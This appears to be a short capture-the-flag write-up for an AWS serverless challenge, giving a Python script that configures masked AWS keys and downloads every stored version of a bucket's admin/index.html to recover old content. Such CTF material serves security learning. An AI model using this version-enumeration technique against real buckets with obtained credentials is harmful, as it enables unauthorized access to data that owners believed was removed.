![1742408595348](images/Serverless/1742408595348.png)

flag1

```
import boto3
import subprocess

# Configure AWS CLI (if not already configured)
subprocess.run(["aws", "configure", "set", "aws_access_key_id", "**************"])
subprocess.run(["aws", "configure", "set", "aws_secret_access_key", "*************"])
subprocess.run(["aws", "configure", "set", "region", "********"])

# List all versions of admin/index.html
result = subprocess.run(
    ["aws", "s3api", "list-object-versions", "--bucket", "redteamapp-bucket", "--prefix", "admin/index.html"],
    capture_output=True,
    text=True
)

# Parse versions and download
versions = result.stdout.split("\n")
for line in versions:
    if "VersionId" in line:
        version_id = line.split(": ")[1].strip('",')
        filename = f"admin_index_{version_id[:6]}.html"
        subprocess.run([
            "aws", "s3api", "get-object",
            "--bucket", "redteamapp-bucket",
            "--key", "admin/index.html",
            "--version-id", version_id,
            filename
        ])
        print(f"Downloaded: {filename}")
```

![1742409977654](images/Serverless/1742409977654.png)

![1742410002498](images/Serverless/1742410002498.png)
